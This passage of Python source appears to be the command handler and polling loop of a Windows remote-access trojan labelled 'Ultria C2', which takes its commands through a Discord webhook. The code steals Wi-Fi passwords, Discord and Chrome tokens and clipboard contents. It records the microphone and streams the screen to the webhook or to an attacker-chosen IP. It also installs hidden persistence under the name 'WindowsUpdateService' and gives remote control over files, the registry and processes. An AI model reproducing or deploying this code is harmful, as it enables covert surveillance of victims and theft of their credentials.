        "                        v4r_dl = v4r_c2rq.get(v4r_pts[0], timeout=30)\n"
        "                        with open(v4r_dest,'wb') as v4r_f: v4r_f.write(v4r_dl.content)\n"
        "                        v4r_c2_result('Downloaded: '+v4r_dest)\n"
        "                    except Exception as v4r_e: v4r_c2_result('Download failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::exit':\n"
        "                    v4r_c2_result('Process killed.')\n"
        "                    v4r_c2os._exit(0)\n"
        "                elif cmd.startswith('CMD::ls'):\n"
        "                    try:\n"
        "                        v4r_d = (cmd[9:] if len(cmd)>9 else '') or v4r_c2os.getcwd()\n"
        "                        v4r_items = v4r_c2os.listdir(v4r_d)\n"
        "                        v4r_out = []\n"
        "                        for v4r_it in sorted(v4r_items):\n"
        "                            v4r_fp = v4r_c2os.path.join(v4r_d, v4r_it)\n"
        "                            v4r_tag = '[D]' if v4r_c2os.path.isdir(v4r_fp) else '[F]'\n"
        "                            try: v4r_sz = str(v4r_c2os.path.getsize(v4r_fp))+' B'\n"
        "                            except: v4r_sz = '?'\n"
        "                            v4r_out.append(v4r_tag+' '+v4r_it+' ('+v4r_sz+')')\n"
        "                        v4r_c2_result(v4r_d+'\\n'+'\\n'.join(v4r_out[:200]))\n"
        "                    except Exception as v4r_e: v4r_c2_result('ls failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::cat::'):\n"
        "                    try:\n"
        "                        v4r_p = cmd[10:]\n"
        "                        with open(v4r_p,'r',encoding='utf-8',errors='replace') as v4r_f:\n"
        "                            v4r_c2_result(v4r_f.read(8000))\n"
        "                    except Exception as v4r_e: v4r_c2_result('cat failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::write::'):\n"
        "                    try:\n"
        "                        v4r_pts = cmd[12:].split('::',1)\n"
        "                        if len(v4r_pts)<2: v4r_c2_result('Usage: CMD::write::<path>::<content>')\n"
        "                        else:\n"
        "                            with open(v4r_pts[0],'w',encoding='utf-8') as v4r_f: v4r_f.write(v4r_pts[1])\n"
        "                            v4r_c2_result('Written: '+v4r_pts[0])\n"
        "                    except Exception as v4r_e: v4r_c2_result('write failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::pwd':\n"
        "                    try: v4r_c2_result(v4r_c2os.getcwd())\n"
        "                    except Exception as v4r_e: v4r_c2_result('pwd failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::cd::'):\n"
        "                    try:\n"
        "                        v4r_c2os.chdir(cmd[9:])\n"
        "                        v4r_c2_result('cwd: '+v4r_c2os.getcwd())\n"
        "                    except Exception as v4r_e: v4r_c2_result('cd failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::ps':\n"
        "                    try:\n"
        "                        v4r_o = v4r_c2sub.check_output(['tasklist','/fo','csv','/nh'], stderr=v4r_c2sub.DEVNULL, creationflags=v4r_c2sub.CREATE_NO_WINDOW, timeout=15).decode('utf-8','ignore')\n"
        "                        v4r_lines = []\n"
        "                        for v4r_l in v4r_o.strip().split('\\n')[:80]:\n"
        "                            v4r_p = v4r_l.strip().strip('\"').split('\",\"')\n"
        "                            if len(v4r_p)>=5: v4r_lines.append(v4r_p[0].ljust(28)+' PID:'+v4r_p[1].ljust(8)+' MEM:'+v4r_p[4])\n"
        "                        v4r_c2_result('\\n'.join(v4r_lines))\n"
        "                    except Exception as v4r_e: v4r_c2_result('ps failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::kill::'):\n"
        "                    try:\n"
        "                        v4r_t = cmd[11:]\n"
        "                        if v4r_t.isdigit(): v4r_c2sub.call(['taskkill','/F','/PID',v4r_t], creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        else: v4r_c2sub.call(['taskkill','/F','/IM',v4r_t], creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        v4r_c2_result('Killed: '+v4r_t)\n"
        "                    except Exception as v4r_e: v4r_c2_result('kill failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::wifi':\n"
        "                    try:\n"
        "                        v4r_prof = v4r_c2sub.check_output(['netsh','wlan','show','profiles'], stderr=v4r_c2sub.DEVNULL, creationflags=v4r_c2sub.CREATE_NO_WINDOW, timeout=10).decode('utf-8','ignore')\n"
        "                        import re as _v4r_wre\n"
        "                        v4r_nets = [m.group(1).strip() for m in _v4r_wre.finditer(r':\\s+(.+)$',v4r_prof,_v4r_wre.MULTILINE)]\n"
        "                        v4r_res = []\n"
        "                        for v4r_n in v4r_nets:\n"
        "                            if not v4r_n: continue\n"
        "                            try:\n"
        "                                v4r_raw2 = v4r_c2sub.check_output(['netsh','wlan','show','profile','name='+v4r_n,'key=clear'], stderr=v4r_c2sub.DEVNULL, creationflags=v4r_c2sub.CREATE_NO_WINDOW, timeout=8)\n"
        "                                try: v4r_det = v4r_raw2.decode('utf-8','ignore')\n"
        "                                except: v4r_det = v4r_raw2.decode('cp1252','ignore')\n"
        "                                v4r_pw_m = _v4r_wre.search(r'(?:Key Content|Contenu de la cl[e\\xe9])\\s*:\\s*(.*)',v4r_det,_v4r_wre.IGNORECASE)\n"
        "                                v4r_pw = v4r_pw_m.group(1).strip() if v4r_pw_m else '<no key>'\n"
        "                                v4r_res.append(v4r_n+' : '+v4r_pw)\n"
        "                            except: v4r_res.append(v4r_n+' : <error>')\n"
        "                        v4r_c2_result('\\n'.join(v4r_res) or 'No WiFi profiles found.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('wifi failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::clip':\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct2\n"
        "                        v4r_ct2.windll.user32.OpenClipboard(0)\n"
        "                        v4r_h = v4r_ct2.windll.user32.GetClipboardData(13)\n"
        "                        if v4r_h:\n"
        "                            v4r_ptr = v4r_ct2.windll.kernel32.GlobalLock(v4r_h)\n"
        "                            v4r_txt = v4r_ct2.wstring_at(v4r_ptr) if v4r_ptr else ''\n"
        "                            v4r_ct2.windll.kernel32.GlobalUnlock(v4r_h)\n"
        "                            v4r_c2_result(v4r_txt or '(empty)')\n"
        "                        else: v4r_c2_result('(empty)')\n"
        "                        v4r_ct2.windll.user32.CloseClipboard()\n"
        "                    except Exception as v4r_e: v4r_c2_result('clip failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::clip_set::'):\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct3\n"
        "                        v4r_txt = cmd[15:]\n"
        "                        v4r_data = (v4r_txt+'\\0').encode('utf-16-le')\n"
        "                        v4r_h = v4r_ct3.windll.kernel32.GlobalAlloc(0x0042, len(v4r_data))\n"
        "                        v4r_ptr = v4r_ct3.windll.kernel32.GlobalLock(v4r_h)\n"
        "                        v4r_ct3.memmove(v4r_ptr, v4r_data, len(v4r_data))\n"
        "                        v4r_ct3.windll.kernel32.GlobalUnlock(v4r_h)\n"
        "                        v4r_ct3.windll.user32.OpenClipboard(0)\n"
        "                        v4r_ct3.windll.user32.EmptyClipboard()\n"
        "                        v4r_ct3.windll.user32.SetClipboardData(13, v4r_h)\n"
        "                        v4r_ct3.windll.user32.CloseClipboard()\n"
        "                        v4r_c2_result('Clipboard set.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('clip_set failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::msgbox::'):\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct4\n"
        "                        v4r_pts = cmd[13:].split('::',1)\n"
        "                        v4r_title = v4r_pts[0] if len(v4r_pts)>1 else 'Info'\n"
        "                        v4r_msg = v4r_pts[1] if len(v4r_pts)>1 else v4r_pts[0]\n"
        "                        v4r_ct4.windll.user32.MessageBoxW(0, v4r_msg, v4r_title, 0)\n"
        "                        v4r_c2_result('MessageBox shown.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('msgbox failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::url::'):\n"
        "                    try:\n"
        "                        import webbrowser as v4r_wb\n"
        "                        v4r_wb.open(cmd[10:])\n"
        "                        v4r_c2_result('URL opened.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('url failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::env':\n"
        "                    try:\n"
        "                        v4r_out = '\\n'.join(k+'='+v for k,v in v4r_c2os.environ.items())\n"
        "                        v4r_c2_result(v4r_out[:3900])\n"
        "                    except Exception as v4r_e: v4r_c2_result('env failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::drives':\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct5; import string as v4r_st\n"
        "                        v4r_drives=[]\n"
        "                        for v4r_dl in v4r_st.ascii_uppercase:\n"
        "                            v4r_p=v4r_dl+':\\\\'\n"
        "                            if v4r_c2os.path.exists(v4r_p):\n"
        "                                try:\n"
        "                                    v4r_tot,v4r_free=v4r_ct5.c_ulonglong(0),v4r_ct5.c_ulonglong(0)\n"
        "                                    v4r_ct5.windll.kernel32.GetDiskFreeSpaceExW(v4r_p,None,v4r_ct5.byref(v4r_tot),v4r_ct5.byref(v4r_free))\n"
        "                                    v4r_drives.append(v4r_p+' total:'+str(v4r_tot.value//1073741824)+'GB free:'+str(v4r_free.value//1073741824)+'GB')\n"
        "                                except: v4r_drives.append(v4r_p)\n"
        "                        v4r_c2_result('\\n'.join(v4r_drives))\n"
        "                    except Exception as v4r_e: v4r_c2_result('drives failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::sysinfo':\n"
        "                    try:\n"
        "                        import platform as v4r_pf, ctypes as v4r_ct6\n"
        "                        v4r_mem=v4r_ct6.c_ulonglong(0)\n"
        "                        v4r_ct6.windll.kernel32.GetPhysicallyInstalledSystemMemory(v4r_ct6.byref(v4r_mem))\n"
        "                        v4r_info=[\n"
        "                            'Host: '+v4r_c2_host,\n"
        "                            'OS: '+v4r_pf.platform(),\n"
        "                            'CPU: '+v4r_pf.processor(),\n"
        "                            'RAM: '+str(v4r_mem.value//1048576)+'MB',\n"
        "                            'User: '+v4r_c2os.environ.get('USERNAME','?'),\n"
        "                            'Domain: '+v4r_c2os.environ.get('USERDOMAIN','?'),\n"
        "                            'AppData: '+v4r_c2os.environ.get('APPDATA','?'),\n"
        "                            'Python: '+v4r_pf.python_version(),\n"
        "                        ]\n"
        "                        v4r_c2_result('\\n'.join(v4r_info))\n"
        "                    except Exception as v4r_e: v4r_c2_result('sysinfo failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::lock':\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct7\n"
        "                        v4r_ct7.windll.user32.LockWorkStation()\n"
        "                        v4r_c2_result('Screen locked.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('lock failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::resolution':\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct8\n"
        "                        v4r_w=v4r_ct8.windll.user32.GetSystemMetrics(0)\n"
        "                        v4r_h=v4r_ct8.windll.user32.GetSystemMetrics(1)\n"
        "                        v4r_c2_result(str(v4r_w)+'x'+str(v4r_h))\n"
        "                    except Exception as v4r_e: v4r_c2_result('resolution failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::uptime':\n"
        "                    try:\n"
        "                        import ctypes as v4r_ct9\n"
        "                        v4r_ms=v4r_ct9.windll.kernel32.GetTickCount64()\n"
        "                        v4r_s=v4r_ms//1000; v4r_m=v4r_s//60; v4r_hh=v4r_m//60; v4r_dd=v4r_hh//24\n"
        "                        v4r_c2_result(str(v4r_dd)+'d '+str(v4r_hh%24)+'h '+str(v4r_m%60)+'m '+str(v4r_s%60)+'s')\n"
        "                    except Exception as v4r_e: v4r_c2_result('uptime failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::location':\n"
        "                    try:\n"
        "                        v4r_r=v4r_c2rq.get('http://ip-api.com/json', timeout=8).json()\n"
        "                        v4r_c2_result('IP: '+v4r_r.get('query','?')+'\\nCountry: '+v4r_r.get('country','?')+'\\nCity: '+v4r_r.get('city','?')+'\\nISP: '+v4r_r.get('isp','?')+'\\nLat/Lon: '+str(v4r_r.get('lat','?'))+'/'+str(v4r_r.get('lon','?')))\n"
        "                    except Exception as v4r_e: v4r_c2_result('location failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::volume::'):\n"
        "                    try:\n"
        "                        import ctypes as v4r_cta\n"
        "                        v4r_vol=max(0,min(100,int(cmd[13:])))\n"
        "                        v4r_v=int(v4r_vol*65535//100)\n"
        "                        v4r_cta.windll.winmm.waveOutSetVolume(None,(v4r_v<<16)|v4r_v)\n"
        "                        v4r_c2_result('Volume set to '+str(v4r_vol)+'%')\n"
        "                    except Exception as v4r_e: v4r_c2_result('volume failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::tokens':\n"
        "                    try:\n"
        "                        import glob as v4r_gl, base64 as v4r_b64, json as v4r_js, re as v4r_re2\n"
        "                        v4r_ap=v4r_c2os.environ.get('APPDATA','')\n"
        "                        v4r_lp=v4r_c2os.environ.get('LOCALAPPDATA','')\n"
        "                        v4r_paths=[\n"
        "                            v4r_c2os.path.join(v4r_ap,'discord','Local Storage','leveldb'),\n"
        "                            v4r_c2os.path.join(v4r_ap,'discordcanary','Local Storage','leveldb'),\n"
        "                            v4r_c2os.path.join(v4r_ap,'discordptb','Local Storage','leveldb'),\n"
        "                            v4r_c2os.path.join(v4r_lp,'Google','Chrome','User Data','Default','Local Storage','leveldb'),\n"
        "                        ]\n"
        "                        v4r_tok=set()\n"
        "                        v4r_pat=v4r_re2.compile(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}')\n"
        "                        for v4r_d in v4r_paths:\n"
        "                            for v4r_f in v4r_gl.glob(v4r_d+'/*.ldb')+v4r_gl.glob(v4r_d+'/*.log'):\n"
        "                                try:\n"
        "                                    with open(v4r_f,'rb') as v4r_fh: v4r_tok.update(v4r_pat.findall(v4r_fh.read().decode('utf-8','ignore')))\n"
        "                                except: pass\n"
        "                        v4r_c2_result('\\n'.join(v4r_tok) if v4r_tok else 'No tokens found.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('tokens failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::installed':\n"
        "                    try:\n"
        "                        import winreg as v4r_wr2\n"
        "                        v4r_apps=[]\n"
        "                        for v4r_hive,v4r_key in [\n"
        "                            (v4r_wr2.HKEY_LOCAL_MACHINE,r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'),\n"
        "                            (v4r_wr2.HKEY_LOCAL_MACHINE,r'SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall'),\n"
        "                            (v4r_wr2.HKEY_CURRENT_USER,r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall'),\n"
        "                        ]:\n"
        "                            try:\n"
        "                                v4r_k=v4r_wr2.OpenKey(v4r_hive, v4r_key)\n"
        "                                for v4r_i in range(v4r_wr2.QueryInfoKey(v4r_k)[0]):\n"
        "                                    try:\n"
        "                                        v4r_sk=v4r_wr2.OpenKey(v4r_k, v4r_wr2.EnumKey(v4r_k, v4r_i))\n"
        "                                        v4r_n=v4r_wr2.QueryValueEx(v4r_sk,'DisplayName')[0]\n"
        "                                        try: v4r_ver=v4r_wr2.QueryValueEx(v4r_sk,'DisplayVersion')[0]\n"
        "                                        except: v4r_ver=''\n"
        "                                        if v4r_n not in [x.split(' | ')[0] for x in v4r_apps]:\n"
        "                                            v4r_apps.append(v4r_n+(' | '+v4r_ver if v4r_ver else ''))\n"
        "                                    except: pass\n"
        "                            except: pass\n"
        "                        v4r_c2_result('\\n'.join(sorted(v4r_apps)[:150]))\n"
        "                    except Exception as v4r_e: v4r_c2_result('installed failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::startup':\n"
        "                    try:\n"
        "                        import winreg as v4r_wr3\n"
        "                        v4r_items=[]\n"
        "                        for v4r_hive,v4r_key in [\n"
        "                            (v4r_wr3.HKEY_CURRENT_USER,r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),\n"
        "                            (v4r_wr3.HKEY_LOCAL_MACHINE,r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'),\n"
        "                        ]:\n"
        "                            try:\n"
        "                                v4r_k=v4r_wr3.OpenKey(v4r_hive,v4r_key)\n"
        "                                for v4r_i in range(v4r_wr3.QueryInfoKey(v4r_k)[1]):\n"
        "                                    v4r_name,v4r_val,_=v4r_wr3.EnumValue(v4r_k,v4r_i)\n"
        "                                    v4r_items.append(v4r_name+' = '+str(v4r_val))\n"
        "                            except: pass\n"
        "                        v4r_c2_result('\\n'.join(v4r_items) if v4r_items else 'No startup entries.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('startup failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::persist':\n"
        "                    try:\n"
        "                        import winreg as v4r_wr4\n"
        "                        v4r_self=v4r_c2sys.executable if getattr(v4r_c2sys,'frozen',False) else v4r_c2os.path.abspath(__file__)\n"
        "                        v4r_k=v4r_wr4.OpenKey(v4r_wr4.HKEY_CURRENT_USER,r'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,v4r_wr4.KEY_SET_VALUE)\n"
        "                        v4r_wr4.SetValueEx(v4r_k,'WindowsUpdateService',0,v4r_wr4.REG_SZ,v4r_self)\n"
        "                        v4r_wr4.CloseKey(v4r_k)\n"
        "                        v4r_c2_result('Persistence added: '+v4r_self)\n"
        "                    except Exception as v4r_e: v4r_c2_result('persist failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::unpersist':\n"
        "                    try:\n"
        "                        import winreg as v4r_wr5\n"
        "                        v4r_k=v4r_wr5.OpenKey(v4r_wr5.HKEY_CURRENT_USER,r'Software\\Microsoft\\Windows\\CurrentVersion\\Run',0,v4r_wr5.KEY_SET_VALUE)\n"
        "                        try: v4r_wr5.DeleteValue(v4r_k,'WindowsUpdateService')\n"
        "                        except: pass\n"
        "                        v4r_wr5.CloseKey(v4r_k)\n"
        "                        v4r_c2_result('Persistence removed.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('unpersist failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::mic::'):\n"
        "                    try:\n"
        "                        import sounddevice as v4r_sd, soundfile as v4r_sf\n"
        "                        v4r_secs=int(cmd[10:]) if cmd[10:].isdigit() else 5\n"
        "                        v4r_sr=44100\n"
        "                        v4r_rec=v4r_sd.rec(int(v4r_secs*v4r_sr),samplerate=v4r_sr,channels=1,dtype='int16')\n"
        "                        v4r_sd.wait()\n"
        "                        v4r_buf=v4r_c2io.BytesIO()\n"
        "                        v4r_sf.write(v4r_buf,v4r_rec,v4r_sr,format='WAV',subtype='PCM_16')\n"
        "                        v4r_buf.seek(0)\n"
        "                        v4r_c2rq.post(v4r_c2_wh,files={'file':('mic_'+v4r_c2_host+'.wav',v4r_buf,'audio/wav')},data={'username':'Ultria C2'},timeout=30)\n"
        "                    except Exception as v4r_e: v4r_c2_result('mic failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::netstat':\n"
        "                    try:\n"
        "                        v4r_o=v4r_c2sub.check_output(['netstat','-ano'],stderr=v4r_c2sub.DEVNULL,creationflags=v4r_c2sub.CREATE_NO_WINDOW,timeout=15).decode('utf-8','ignore')\n"
        "                        v4r_c2_result(v4r_o[:3900])\n"
        "                    except Exception as v4r_e: v4r_c2_result('netstat failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::rename::'):\n"
        "                    try:\n"
        "                        v4r_pts=cmd[13:].split('::',1)\n"
        "                        if len(v4r_pts)<2: v4r_c2_result('Usage: CMD::rename::<src>::<dst>')\n"
        "                        else:\n"
        "                            v4r_c2os.rename(v4r_pts[0],v4r_pts[1])\n"
        "                            v4r_c2_result('Renamed: '+v4r_pts[0]+' -> '+v4r_pts[1])\n"
        "                    except Exception as v4r_e: v4r_c2_result('rename failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::del::'):\n"
        "                    try:\n"
        "                        v4r_p=cmd[10:]\n"
        "                        if v4r_c2os.path.isfile(v4r_p): v4r_c2os.remove(v4r_p); v4r_c2_result('Deleted: '+v4r_p)\n"
        "                        else: v4r_c2_result('Not a file: '+v4r_p)\n"
        "                    except Exception as v4r_e: v4r_c2_result('del failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::mkdir::'):\n"
        "                    try:\n"
        "                        v4r_c2os.makedirs(cmd[12:],exist_ok=True)\n"
        "                        v4r_c2_result('Created: '+cmd[12:])\n"
        "                    except Exception as v4r_e: v4r_c2_result('mkdir failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::search::'):\n"
        "                    try:\n"
        "                        import glob as v4r_gl2\n"
        "                        v4r_pattern=cmd[13:]\n"
        "                        v4r_found=v4r_gl2.glob(v4r_pattern,recursive=True)\n"
        "                        v4r_c2_result('\\n'.join(v4r_found[:100]) if v4r_found else 'No matches.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('search failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::shutdown::'):\n"
        "                    try:\n"
        "                        v4r_mode=cmd[15:].lower()\n"
        "                        if v4r_mode=='reboot': v4r_c2sub.call(['shutdown','/r','/t','5'],creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        elif v4r_mode=='off': v4r_c2sub.call(['shutdown','/s','/t','5'],creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        elif v4r_mode=='logoff': v4r_c2sub.call(['shutdown','/l'],creationflags=v4r_c2sub.CREATE_NO_WINDOW)\n"
        "                        else: v4r_c2_result('Usage: CMD::shutdown::<reboot|off|logoff>')\n"
        "                        v4r_c2_result('Shutdown command sent: '+v4r_mode)\n"
        "                    except Exception as v4r_e: v4r_c2_result('shutdown failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::whoami':\n"
        "                    try:\n"
        "                        v4r_o=v4r_c2sub.check_output(['whoami','/all'],stderr=v4r_c2sub.DEVNULL,creationflags=v4r_c2sub.CREATE_NO_WINDOW,timeout=10).decode('utf-8','ignore')\n"
        "                        v4r_c2_result(v4r_o[:3900])\n"
        "                    except Exception as v4r_e: v4r_c2_result('whoami failed: '+str(v4r_e))\n"
        "                elif cmd == 'CMD::arp':\n"
        "                    try:\n"
        "                        v4r_o=v4r_c2sub.check_output(['arp','-a'],stderr=v4r_c2sub.DEVNULL,creationflags=v4r_c2sub.CREATE_NO_WINDOW,timeout=10).decode('utf-8','ignore')\n"
        "                        v4r_c2_result(v4r_o[:3900])\n"
        "                    except Exception as v4r_e: v4r_c2_result('arp failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::reg_read::'):\n"
        "                    try:\n"
        "                        import winreg as v4r_wr6\n"
        "                        v4r_pts=cmd[15:].split('::',2)\n"
        "                        v4r_hives={'HKCU':v4r_wr6.HKEY_CURRENT_USER,'HKLM':v4r_wr6.HKEY_LOCAL_MACHINE,'HKCC':v4r_wr6.HKEY_CURRENT_CONFIG}\n"
        "                        v4r_hive_name=v4r_pts[0].upper()\n"
        "                        v4r_h=v4r_hives.get(v4r_hive_name)\n"
        "                        if not v4r_h: v4r_c2_result('Unknown hive. Use HKCU/HKLM/HKCC')\n"
        "                        else:\n"
        "                            v4r_k=v4r_wr6.OpenKey(v4r_h,v4r_pts[1])\n"
        "                            v4r_val,_=v4r_wr6.QueryValueEx(v4r_k,v4r_pts[2] if len(v4r_pts)>2 else '')\n"
        "                            v4r_c2_result(str(v4r_val))\n"
        "                    except Exception as v4r_e: v4r_c2_result('reg_read failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::reg_write::'):\n"
        "                    try:\n"
        "                        import winreg as v4r_wr7\n"
        "                        v4r_pts=cmd[16:].split('::',3)\n"
        "                        v4r_hives={'HKCU':v4r_wr7.HKEY_CURRENT_USER,'HKLM':v4r_wr7.HKEY_LOCAL_MACHINE}\n"
        "                        v4r_h=v4r_hives.get(v4r_pts[0].upper())\n"
        "                        if not v4r_h or len(v4r_pts)<4: v4r_c2_result('Usage: CMD::reg_write::HKCU::<key>::<name>::<value>')\n"
        "                        else:\n"
        "                            v4r_k=v4r_wr7.CreateKeyEx(v4r_h,v4r_pts[1],0,v4r_wr7.KEY_SET_VALUE)\n"
        "                            v4r_wr7.SetValueEx(v4r_k,v4r_pts[2],0,v4r_wr7.REG_SZ,v4r_pts[3])\n"
        "                            v4r_c2_result('Registry written.')\n"
        "                    except Exception as v4r_e: v4r_c2_result('reg_write failed: '+str(v4r_e))\n"
        "                elif cmd.startswith('CMD::screenstream::'):\n"
        "                    try:\n"
        "                        v4r_spts=cmd[19:].split('::')\n"
        "                        if v4r_spts[0]=='stop':\n"
        "                            v4r_stream_stop[0]=True\n"
        "                            v4r_c2_result('Stream stopped.')\n"
        "                        elif v4r_spts[0]=='discord':\n"
        "                            v4r_sfps=max(1,min(2,int(v4r_spts[1]))) if len(v4r_spts)>1 else 1\n"
        "                            v4r_squal=max(30,min(85,int(v4r_spts[2]))) if len(v4r_spts)>2 else 60\n"
        "                            v4r_stream_stop[0]=False\n"
        "                            def v4r_dc_stream(v4r_fps,v4r_qual):\n"
        "                                from PIL import ImageGrab as v4r_DIG\n"
        "                                import io as v4r_DSIO\n"
        "                                v4r_ivl=1.0/v4r_fps\n"
        "                                while not v4r_stream_stop[0]:\n"
        "                                    try:\n"
        "                                        v4r_t0=v4r_c2time.time()\n"
        "                                        v4r_img=v4r_DIG.grab()\n"
        "                                        v4r_buf=v4r_DSIO.BytesIO()\n"
        "                                        v4r_img.save(v4r_buf,format='JPEG',quality=v4r_qual,optimize=True)\n"
        "                                        v4r_buf.seek(0)\n"
        "                                        v4r_c2rq.post(v4r_c2_wh,files={'file':('f.jpg',v4r_buf.read(),'image/jpeg')},data={'username':'Ultria C2'},timeout=10)\n"
        "                                        v4r_elapsed=v4r_c2time.time()-v4r_t0\n"
        "                                        v4r_sl=max(0,v4r_ivl-v4r_elapsed)\n"
        "                                        if v4r_sl>0: v4r_c2time.sleep(v4r_sl)\n"
        "                                    except: v4r_c2time.sleep(2)\n"
        "                            v4r_c2t.Thread(target=v4r_dc_stream,args=(v4r_sfps,v4r_squal),daemon=True).start()\n"
        "                            v4r_c2_result(f'Discord stream {v4r_sfps}fps/{v4r_squal}%')\n"
        "                        else:\n"
        "                            v4r_sip   = v4r_spts[0] if len(v4r_spts)>0 else '127.0.0.1'\n"
        "                            v4r_sport = int(v4r_spts[1]) if len(v4r_spts)>1 else 9876\n"
        "                            v4r_sfps  = max(1,int(v4r_spts[2])) if len(v4r_spts)>2 else 8\n"
        "                            v4r_squal = max(10,min(95,int(v4r_spts[3]))) if len(v4r_spts)>3 else 65\n"
        "                            v4r_stream_stop[0]=False\n"
        "                            def v4r_stream_fn(v4r_ip,v4r_port,v4r_fps,v4r_qual):\n"
        "                                from PIL import ImageGrab as v4r_IG\n"
        "                                import io as v4r_SIO\n"
        "                                v4r_url=('https://'+v4r_ip+'/frame' if v4r_port==443 else ('http://'+v4r_ip+'/frame' if v4r_port==80 else f'http://{v4r_ip}:{v4r_port}/frame'))\n"
        "                                v4r_interval=1.0/v4r_fps\n"
        "                                v4r_cur_qual=[v4r_qual]\n"
        "                                while not v4r_stream_stop[0]:\n"
        "                                    try:\n"
        "                                        v4r_t0=v4r_c2time.time()\n"
        "                                        v4r_img=v4r_IG.grab()\n"
        "                                        v4r_buf=v4r_SIO.BytesIO()\n"
        "                                        v4r_img.save(v4r_buf,format='JPEG',quality=v4r_cur_qual[0],optimize=True)\n"
        "                                        v4r_buf.seek(0)\n"
        "                                        v4r_c2rq.post(v4r_url,data=v4r_buf.read(),headers={'Content-Type':'image/jpeg'},timeout=v4r_interval*2+1)\n"
        "                                        v4r_elapsed=v4r_c2time.time()-v4r_t0\n"
        "                                        if v4r_elapsed>v4r_interval*1.5 and v4r_cur_qual[0]>15:\n"
        "                                            v4r_cur_qual[0]=max(15,v4r_cur_qual[0]-5)\n"
        "                                        elif v4r_elapsed<v4r_interval*0.5 and v4r_cur_qual[0]<v4r_qual:\n"
        "                                            v4r_cur_qual[0]=min(v4r_qual,v4r_cur_qual[0]+3)\n"
        "                                        v4r_sleep=max(0,v4r_interval-v4r_elapsed)\n"
        "                                        if v4r_sleep>0: v4r_c2time.sleep(v4r_sleep)\n"
        "                                    except: v4r_c2time.sleep(1)\n"
        "                            v4r_c2t.Thread(target=v4r_stream_fn,args=(v4r_sip,v4r_sport,v4r_sfps,v4r_squal),daemon=True).start()\n"
        "                            v4r_c2_result(f'Stream started → {v4r_sip}:{v4r_sport} {v4r_sfps}fps/{v4r_squal}%')\n"
        "                    except Exception as v4r_e: v4r_c2_result('screenstream failed: '+str(v4r_e))\n"
        "            except Exception: pass\n"
        "        def v4r_c2_loop():\n"
        "            while True:\n"
        "                try:\n"
        "                    v4r_mid = v4r_c2_register()\n"
        "                    v4r_c2_mid[0] = v4r_mid\n"
        "                    while True:\n"
        "                        v4r_c2time.sleep(4)\n"
        "                        v4r_ts = v4r_c2time.strftime('%H:%M:%S')\n"
        "                        v4r_st = '`'+v4r_c2_host+'` | READY | '+v4r_ts\n"
        "                        v4r_msg = v4r_c2_get(v4r_c2_mid[0])\n"
        "                        if v4r_msg is None:\n"
        "                            break\n"
        "                        v4r_emb = v4r_msg.get('embeds',[])\n"
        "                        if not v4r_emb: continue\n"
        "                        v4r_desc = v4r_emb[0].get('description','').strip()\n"
        "                        if v4r_desc.startswith('CMD::'):\n"
        "                            v4r_c2_patch(v4r_c2_mid[0], '`'+v4r_c2_host+'` | RUNNING... | '+v4r_ts)\n"
        "                            v4r_c2_exec(v4r_desc)\n"
        "                            v4r_c2_patch(v4r_c2_mid[0], v4r_st)\n"
